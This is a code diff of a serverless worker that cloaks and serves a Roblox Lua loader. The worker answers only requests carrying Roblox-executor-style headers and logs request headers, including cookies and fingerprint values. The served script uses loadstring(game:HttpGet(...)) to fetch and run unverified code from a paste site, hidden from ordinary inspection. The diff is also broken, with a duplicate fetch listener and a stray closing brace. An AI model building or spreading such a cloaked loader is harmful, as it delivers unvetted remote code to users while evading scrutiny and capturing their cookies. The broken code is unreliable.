@@ -3,66 +3,77 @@ addEventListener('fetch', event => {
 })
 
 async function handleRequest(request) {
-  // Only handle requests to the root ('/') route
-  const url = new URL(request.url)
-  if (url.pathname !== '/') {
-    return new Response('Not Found', { status: 404 })
+  // Log request details for debugging
+  console.log(`Request Path: ${new URL(request.url).pathname}`)
+  console.log(`Request Headers: ${JSON.stringify([...request.headers])}`)
+
+  // Expected headers with exact case-sensitive values
+  const expectedHeaders = {
+    "Host": "127.0.0.1:5000",
+    "User-Agent": "Roblox/WinInet",
+    "Accept": "*/*"
   }
 
-  // Check if the request method is GET
-  if (request.method !== 'GET') {
-    return new Response('Method Not Allowed', { status: 405 })
+  // Store unexpected headers for logging
+  const unexpectedHeaders = []
+
+  // Loop through all request headers and compare against allowed ones
+  for (let [key, value] of request.headers.entries()) {
+    // Make header key case-insensitive
+    const headerKeyLower = key.toLowerCase()
+
+    // Check if the header is one we want to check strictly
+    if (Object.keys(expectedHeaders).map(k => k.toLowerCase()).includes(headerKeyLower)) {
+      if (value !== expectedHeaders[key]) {  // Compare value
+        unexpectedHeaders.push(`${key}: ${value}`)
+      }
+    } else {
+      // For cookies and fingerprint headers (any name), allow them without checking the value
+      if (key.toLowerCase() === "cookie") {
+        console.log(`Cookie header found: ${value}`)
+      } else if (key.toLowerCase().includes("fingerprint")) {  // Matches any fingerprint header (any name)
+        console.log(`Fingerprint header found: ${key}: ${value}`)
+      } else {
+        unexpectedHeaders.push(`${key}: ${value}`)
+      }
+    }
   }
 
-  // Get the custom headers for screen resolution
-  const screenWidth = request.headers.get('X-Screen-Width');
-  const screenHeight = request.headers.get('X-Screen-Height');
+  // Debugging: Print unexpected headers
+  console.log(`Unexpected headers found: ${unexpectedHeaders}`)
 
-  // Check if screen resolution matches 551x979
-  if (screenWidth === '551' && screenHeight === '979') {
-    // Deny access if resolution matches
-    const htmlContent = `
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Access Denied</title>
-        <style>
-          body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-            color: #333;
-          }
-          h1 {
-            color: #e74c3c;
-          }
-        </style>
-      </head>
-      <body>
-        <h1>Access Denied</h1>
-        <p>Your screen resolution of 551x979 is not allowed to access this resource.</p>
-      </body>
-      </html>
-    `;
-    return new Response(htmlContent, {
-      headers: { 'Content-Type': 'text/html' },
-      status: 403
-    });
+  // If there are any unexpected headers, deny access with a 403 Forbidden
+  if (unexpectedHeaders.length > 0) {
+    return new Response("Forbidden", { status: 403 })
   }
 
-  // If resolution does not match, proceed with the normal response
+  // If headers are valid, respond with the Lua script
   const robloxScript = `
--- Roblox Lua Script
---[[
-  WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet("https://pastejustit.com/raw/pk4w9dy7nf"))()
-`;
+  -- Roblox Lua Script
+  --[[
+    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+  ]]
+  print("Request allowed. Welcome!")
+  loadstring(game:HttpGet("https://pastejustit.com/raw/pk4w9dy7nf"))()
+  `
 
-  // Respond with the Roblox Lua script
   return new Response(robloxScript, {
     headers: { 'Content-Type': 'text/plain' }
-  });
+  })
 }
+
+// Custom error handling (404, 405, etc.)
+addEventListener('fetch', event => {
+  event.respondWith(handleErrors(event.request))
+})
+
+async function handleErrors(request) {
+  const url = new URL(request.url)
+  if (url.pathname !== '/') {
+    return new Response(`Invalid Path: '${url.pathname}' is not valid. Only '/' is allowed.`, { status: 404 })
+  }
+
+  if (request.method !== 'GET') {
+    return new Response('Invalid Method: Method Not Allowed', { status: 405 })
+  }
+      }
